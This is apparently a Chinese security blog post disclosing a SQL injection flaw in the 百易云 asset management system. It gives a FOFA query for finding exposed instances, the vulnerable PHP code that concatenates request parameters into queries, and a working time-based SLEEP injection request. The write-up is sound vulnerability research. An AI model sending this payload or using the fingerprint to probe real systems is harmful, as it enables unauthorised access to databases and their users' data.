---
title: "百易云资产管理运营系统 feeStandard.Apply.save2.php SQL注入漏洞"
source: https://mrxn.net/jswz/baiyishequ-adminx-feeStandard-Apply-save2-sqli.html
asset_dir: assets/百易云资产管理运营系统-feestandard.apply.save2.php-sql注入漏洞
---

# 百易云资产管理运营系统 feeStandard.Apply.save2.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/8 08:33
- 818浏览
- [0评论](#comment)
- 1小时阅读

深入探索

企业安全咨询

防火墙软件

文本剥离工具

---

# 漏洞简介

百易云资产管理运营系统，是专门针对企业不动产资产管理和运营需求而设计的一套综合解决方案。该系统能够覆盖资产的全，包括资产的登记、盘点、评估、处置等多个环节，同时提供强大的运营分析功能，帮助企业优化资产配置，提升运营效率。百易云资产管理运营系统 feeStandard.Apply.save2.php 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 [SQL 注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# fofa语法

> `body="不要着急，点此"`

# 漏洞分析

先看 feeStandard.Apply.save2.php 业务逻辑实现部分

```
<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
session_start();
header("content-type:text/html; charset=utf-8");
require_once ("../com/util.class.php"); 
require_once ("../service/feeStandard.service.php");

$act = $_GET["act"] ;
$id  = $_GET["id"] ;
$creator_id = $_SESSION["uid"] ;
$creator_name = $_SESSION["real_name"] ;

$feeStandard = new feeStandard();

 if ($act=="delete") {
    $project_id  = $_GET["project_id"] ;
    $ret = $feeStandard->feeStandardApplyDelete($id ,  $project_id) ; 
    //$feeStandard->dblog($feeStandard->getSql());
 }

 if ($act=="imaAttachRepair") {
    $ret = $feeStandard->boundAttachImaRepair($id ,  $creator_name) ; 
    //$feeStandard->dblog($feeStandard->getSql());
 }

 if ($act=="open") {
    $ret = $feeStandard->userStdOpen( $id ) ;
 }

 if ($act=="close") {
    $ret = $feeStandard->userStdClose( $id ) ;
  }

 if ($act=="copy") {
    $ret = $feeStandard->feeStandardApplyCopy($id ) ; 
 }  

 if ($act=="partEdit") {
     $tag = $_GET['tag'];
    $newval = $_GET['newval'];
    $arrInfo=array($tag=>$newval,"last_update"=>$feeStandard->getTime(),"last_modifier"=>$creator_name);
    $ret = $feeStandard->imaUpdate( $id,$arrInfo);
    if ($ret<0) {
      echo "更新失败.".$feeStandard->getErrInfo() ;
    } else {
       echo "更新成功!" ;
    }
    exit;
 }

 if ($ret<=0) {
   $errInfo= $feeStandard->getErrInfo();
   if ($errInfo=="重复插入") {
      $errInfo=". 已有重复的仪表信息!";
   } else  if ($ret==0)  {
       $errInfo=". 无执行返回!";
   }
   $errInfo="操作失败".$errInfo ;
   if ($act=="delete") {
       $errInfo.=".有产生本月或之后仪表的读数!";
   }
 } else {
    $errInfo="操作成功." ;
 }  

 alertMsg($errInfo ); 

?>
```

根据 `GET` 参数 `act` 来进入不同的函数，当 `act=delete` 时 进入 `feeStandardApplyDelete($id , $project_id)` 函数，看其实现逻辑

代码安全审计

## feeStandardApplyDelete 函数

```
public function feeStandardApplyDelete( $id ,$project_id )  {
        //$icount=$this->dbo->getCount("t_fee_list", "project_id={$project_id} and user_std_id in ( {$id} ) ");
        $where="ima_id in ( {$id} ) and read_month>=DATE_FORMAT(NOW(),'%Y-%m')";
        if ($project_id<>"") $where.="  and project_id=".$project_id ;
        $icount=$this->dbo->getCount("t_ima_read", $where);
        if ($icount==0  ) {
           return   $this->dbo->delete("t_house_fee_standard", "id in( {$id} )");
        } else return 0;
    }
```

可以看到 `id` 和 `project_id` 均是直接拼接在SQL语句中，无任何过滤或校验，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

其余几个函数也存在同样的SQL注入漏洞，下面依次看下各个存在漏洞的函数，就不在一一分析了。

## boundAttachImaRepair 函数

```
public function boundAttachImaRepair( $userStdIds,$creator)  {

        $sql="insert into t_house_fee_standard(project_id,hu_id,res_id,ctt_id,cst_id,fee_id,fee_code,fee_name,fee_standard_id,fee_standard_name,fee_std_type,
                     ima_type_code,ima_type_name,ima_code,ima_name,ima_rate,apply_date_begin,apply_date_end,creator,fmonth_type,from_ima_id)";

        $sql.="select hfs.project_id,hfs.hu_id,hfs.res_id,hfs.ctt_id,hfs.cst_id,b.id as fee_id,b.fee_code,b.fee_name,c.id as fee_standard_id,c.fee_std_name,c.fee_std_type,
                    c.ima_type_code,c.ima_type_name,concat(hfs.ima_code,'-依附') as ima_code,concat(hfs.ima_name,'-依附') as ima_name,
                    hfs.ima_rate,hfs.apply_date_begin as apply_date_begin,hfs.apply_date_end as apply_date_end,'{$creator}' as creator,hfs.fmonth_type as fmonth_type,hfs.id as from_ima_id 
               from t_house_fee_standard hfs ,t_fee_subject b,t_fee_standard c  
               where hfs.id in (".$userStdIds.") and hfs.fee_id=c.attach_fee_id  and b.id=c.fee_subject_id 
                     and  EXISTS(select 1 from t_house_fee_standard imaAttach left join t_house_fee_standard imaMain on imaAttach.from_ima_id=imaMain.id  
                                  where imaAttach.hu_id=hfs.hu_id and imaAttach.fee_std_type='fee_attach2' and imaAttach.fee_id=b.id and  imaMain.fee_id=hfs.fee_id )
                      and not EXISTS(select 1 from t_house_fee_standard where hu_id=hfs.hu_id and fee_std_type='fee_attach2' and fee_standard_id=c.id and fee_id=b.id and from_ima_id=hfs.id )";
        return $this->updateQuery($sql);
    }
```

## userStdOpen 函数

```
public function userStdOpen( $id )  {
        return  $this->dbo->updateQuery("update t_house_fee_standard set status=1,last_update=NOW()  where id in ($id) and status<>1");
    }
```

## userStdClose 函数

```
public function userStdClose( $id )  {
        return  $this->dbo->updateQuery("update t_house_fee_standard set status=0,last_update=NOW()  where id in ($id) and status<>0");
    }
```

## feeStandardApplyCopy 函数

```
public function feeStandardApplyCopy( $id  )  {
        $sql="insert into t_house_fee_standard(project_id,hu_id,res_id,cst_id,ctt_id,fee_id,fee_code,fee_name,fee_standard_id,fee_standard_name,fee_std_type,is_rent,fee_price,ima_type_code,ima_type_name, ima_code,ima_name,ima_rate,apply_date_begin,apply_date_end,lf_standard_id,lf_standard_name,gen_cycle,increase_mode,`status`) select project_id,hu_id,res_id,cst_id,ctt_id,fee_id,fee_code,fee_name,fee_standard_id,fee_standard_name,fee_std_type,is_rent,fee_price,ima_type_code,ima_type_name, concat(ima_code,'-2')  as ima_code,concat(ima_name,'-2') as ima_name,ima_rate,apply_date_begin,apply_date_end,lf_standard_id,lf_standard_name,gen_cycle,increase_mode,`status` from t_house_fee_standard where id=".$id ;

        $ret= $this->insertQuery($sql);

        if ($ret>0){
            $sql2="insert into t_house_fee_standard(project_id,hu_id,res_id,cst_id,ctt_id,fee_id,fee_code,fee_name,fee_standard_id,fee_standard_name,fee_std_type,is_rent,fee_price,ima_type_code,ima_type_name, ima_code,ima_name,ima_rate,apply_date_begin,apply_date_end,lf_standard_id,lf_standard_name,gen_cycle,increase_mode,`status`) 
            select project_id,hu_id,res_id,cst_id,ctt_id,fee_id,fee_code,fee_name,fee_standard_id,fee_standard_name,fee_std_type,is_rent,fee_price,ima_type_code,ima_type_name, concat(ima_code,'-2')  as ima_code,concat(ima_name,'-2') as ima_name,ima_rate,apply_date_begin,apply_date_end,lf_standard_id,lf_standard_name,gen_cycle,increase_mode,`status` from t_house_fee_standard where id=".$id ;       

        }

        return $ret;
    }
```

## imaUpdate 函数

```
public function imaUpdate( $id,$arrInfo)  {
        return $this->dbo->update("t_house_fee_standard",$arrInfo,"id=".$id);
    }
```

# 漏洞复现

```
GET /adminx/feeStandard.Apply.save2.php?act=delete&id=1&project_id=1+AND+%28SELECT+11+FROM+%28SELECT%28SLEEP%285%29%29%29BgSye%29--+- HTTP/1.1
Host: baiyishequ.mrxn.net
```

[![百易云资产管理运营系统 feeStandard.Apply.save2.php SQL注入漏洞](images/img-001-73a4db7480f0.webp)](https://image.mrxn.net/05acb87f109d42b3af7b68141f001d35.webp)

成功延时 5 秒

漏洞扫描服务

其他函数的SQL注入漏洞就不复述了，一样的原理。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.fofa语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [3.1.feeStandardApplyDelete 函数](#toc-3-1-)
- [3.2.boundAttachImaRepair 函数](#toc-3-2-)
- [3.3.userStdOpen 函数](#toc-3-3-)
- [3.4.userStdClose 函数](#toc-3-4-)
- [3.5.feeStandardApplyCopy 函数](#toc-3-5-)
- [3.6.imaUpdate 函数](#toc-3-6-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
